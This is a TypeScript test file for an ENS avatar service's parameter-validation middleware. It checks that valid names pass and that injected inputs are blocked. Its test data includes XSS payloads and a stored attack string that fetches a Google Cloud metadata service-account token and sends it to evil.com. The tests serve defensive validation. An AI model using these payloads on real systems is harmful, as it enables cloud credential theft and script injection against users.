import avaTest, { TestFn } from 'ava';
import { createUniversalValidation } from './validateParameters';

const test = avaTest as TestFn<{}>;

function runValidation(params: any, path: string = '/test', query: any = {}) {
  const validation = createUniversalValidation();
  
  let nextCalled = false;
  let statusCode = 200;
  let responseBody: any = null;
  let statusCalled = false;

  const req = {
    params,
    query,
    path,
    ip: '127.0.0.1',
    method: 'GET',
    get: () => 'test-agent'
  } as any;

  const res = {
    status: (code: number) => {
      statusCode = code;
      statusCalled = true;
      return {
        json: (body: any) => {
          responseBody = body;
          return res;
        }
      };
    }
  } as any;

  const next = () => {
    nextCalled = true;
  };

  validation(req, res, next);

  return {
    nextCalled,
    statusCode,
    responseBody,
    statusCalled
  };
}

// Test valid inputs
test('allows valid ENS names', t => {
  const validNames = ['vitalik.eth', 'test.eth', 'sub.domain.eth'];
  
  validNames.forEach(tokenId => {
    const result = runValidation({
      networkName: 'mainnet',
      contractAddress: '0x1234567890123456789012345678901234567890',
      tokenId
    });

    t.true(result.nextCalled, `Should allow valid ENS name: ${tokenId}`);
    t.false(result.statusCalled, `Should not call status for: ${tokenId}`);
  });
});

test('allows valid numeric token IDs', t => {
  const validTokenIds = ['1', '123', '456789'];
  
  validTokenIds.forEach(tokenId => {
    const result = runValidation({
      networkName: 'mainnet',
      contractAddress: '0x1234567890123456789012345678901234567890',
      tokenId
    });

    t.true(result.nextCalled, `Should allow valid token ID: ${tokenId}`);
    t.false(result.statusCalled, `Should not call status for: ${tokenId}`);
  });
});

// Test attack blocking
test('blocks HTML injection in tokenId', t => {
  const attacks = [
    '1"/><script>alert("xss")</script><!--',
    'test"/><script>fetch("http://evil.com")</script><!--',
    '1"><img src=x onerror=alert(1)>',
    'test<script>',
    'javascript:alert(1)',
    'name"><svg onload=alert(1)>'
  ];
  
  attacks.forEach(tokenId => {
    const result = runValidation({
      networkName: 'mainnet',
      contractAddress: '0x1234567890123456789012345678901234567890',
      tokenId
    });

    t.false(result.nextCalled, `Should block attack: ${tokenId}`);
    t.true(result.statusCalled, `Should call status for attack: ${tokenId}`);
    t.is(result.statusCode, 400, `Should return 400 for attack: ${tokenId}`);
    t.true(
      result.responseBody?.details?.some((d: string) => d.includes('dangerous')),
      `Should mention dangerous characters for: ${tokenId}`
    );
  });
});

// Test the original metadata service attack
test('blocks original metadata service attack', t => {
  const attackPayload = '1"/><script>fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",{headers:{"Metadata-Flavor":"Google"}}).then(r=>r.text()).then(token=>fetch("https://evil.com/steal?token="+token))</script><!--';
  
  const result = runValidation({
    networkName: 'mainnet',
    contractAddress: '0x1234567890123456789012345678901234567890',
    tokenId: attackPayload
  });

  t.false(result.nextCalled, 'Should block the original attack');
  t.true(result.statusCalled, 'Should call status for attack');
  t.is(result.statusCode, 400, 'Should return 400 for attack');
  t.true(
    result.responseBody?.details?.some((d: string) => d.includes('dangerous')),
    'Should mention dangerous characters'
  );
});

// Test network validation
test('blocks invalid networks', t => {
  const invalidNetworks = ['evilnetwork', 'mainnet-attack', 'fake.network'];
  
  invalidNetworks.forEach(networkName => {
    const result = runValidation({
      networkName,
      contractAddress: '0x1234567890123456789012345678901234567890',
      tokenId: '123'
    });

    t.false(result.nextCalled, `Should block invalid network: ${networkName}`);
    t.true(result.statusCalled, `Should call status for invalid network: ${networkName}`);
    t.is(result.statusCode, 400, `Should return 400 for invalid network: ${networkName}`);
  });
});

// Test HTML injection in name parameter
test('blocks HTML injection in name parameter', t => {
  const attacks = [
    'test"/><script>alert(1)</script><!--',
    'avatar<img src=x onerror=alert(1)>',
    'name"><script>steal()</script>'
  ];
  
  attacks.forEach(name => {
    const result = runValidation({
      networkName: 'mainnet',
      name
    }, '/avatar/test');

    t.false(result.nextCalled, `Should block attack in name: ${name}`);
    t.true(result.statusCalled, `Should call status for attack in name: ${name}`);
    t.is(result.statusCode, 400, `Should return 400 for attack in name: ${name}`);
  });
});

// Test query parameter validation
test('blocks HTML injection in query parameters', t => {
  const result = runValidation({}, '/test', {
    tokenId: '1"/><script>alert(1)</script>',
    network: 'evilnetwork'
  });

  t.false(result.nextCalled, 'Should block malicious query params');
  t.true(result.statusCalled, 'Should call status for malicious query params');
  t.is(result.statusCode, 400, 'Should return 400 for malicious query params');
});

// Test safe route skipping
test('skips validation for safe routes', t => {
  const safeRoutes = ['/', '/docs', '/favicon.ico', '/health'];
  
  safeRoutes.forEach(path => {
    const result = runValidation({}, path);
    t.true(result.nextCalled, `Should skip validation for: ${path}`);
    t.false(result.statusCalled, `Should not call status for: ${path}`);
  });
});

// Test comprehensive attack patterns
test('blocks various HTML injection techniques', t => {
  const attackTechniques = [
    // Basic script injection
    '<script>alert(1)</script>',
    
    // Event handlers
    'test" onmouseover="alert(1)"',
    'img" onerror="alert(1)"',
    
    // JavaScript protocol
    'javascript:alert(1)',
    
    // Data URLs
    'data:text/html,<script>alert(1)</script>',
    
    // HTML entities
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    
    // URL encoded
    '%3Cscript%3Ealert(1)%3C/script%3E',
    
    // Mixed techniques
    'test"/><svg onload=alert(1)>',
    '1"><iframe src=javascript:alert(1)></iframe>'
  ];
  
  attackTechniques.forEach(attack => {
    const result = runValidation({
      networkName: 'mainnet',
      contractAddress: '0x1234567890123456789012345678901234567890',
      tokenId: attack
    });

    t.false(result.nextCalled, `Should block attack technique: ${attack}`);
    t.true(result.statusCalled, `Should call status for: ${attack}`);
    t.is(result.statusCode, 400, `Should return 400 for: ${attack}`);
  });
});

// Test international ENS names still work
test('allows international ENS names', t => {
  const internationalNames = [
    '太陽.eth',      // Japanese
    'güneş.eth',     // Turkish  
    'солнце.eth',    // Russian
    'test123.eth'    // Alphanumeric
  ];
  
  internationalNames.forEach(tokenId => {
    const result = runValidation({
      networkName: 'mainnet',
      contractAddress: '0x1234567890123456789012345678901234567890',
      tokenId
    });

    t.true(result.nextCalled, `Should allow international name: ${tokenId}`);
    t.false(result.statusCalled, `Should not block international name: ${tokenId}`);
  });
});
